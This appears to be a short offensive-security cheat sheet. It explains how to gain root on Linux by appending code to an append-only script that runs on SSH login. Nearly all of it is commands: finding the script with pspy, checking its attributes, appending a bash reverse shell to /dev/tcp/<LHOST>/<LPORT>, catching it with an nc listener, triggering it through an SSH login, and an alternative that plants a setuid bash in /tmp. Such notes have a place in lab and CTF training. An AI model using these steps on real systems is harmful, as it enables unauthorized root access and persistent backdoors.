# SSH Login Script Append (chattr+a)

A script run automatically on SSH login (e.g. via `ForceCommand` or placed in `/etc/ssh/sshrc`) may be append-only (`chattr +a`). You can still append malicious code — it executes as root on the next SSH login.

**Detect the script (via pspy watching SSH connections):**
```bash
./pspy64   # watch for UID=0 processes triggered by SSH auth events
# Look for: /usr/local/sbin/ssh-alert.sh or similar
```

**Check file attributes:**
```bash
lsattr /usr/local/sbin/ssh-alert.sh
# ----a--------e-- = append-only (a flag)
```

**Append reverse shell:**
```bash
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /usr/local/sbin/ssh-alert.sh
```

**Trigger execution — connect via SSH to any account:**
```bash
# On attacker:
nc -lnvp <LPORT>
# Trigger:
ssh <USER>@<TARGET>
```

Shell fires as root (or whatever UID runs the script).

**Alternative: append via `tee -a`:**
```bash
echo 'cp /bin/bash /tmp/b && chmod +s /tmp/b' | tee -a /usr/local/sbin/ssh-alert.sh
# then: /tmp/b -p
```
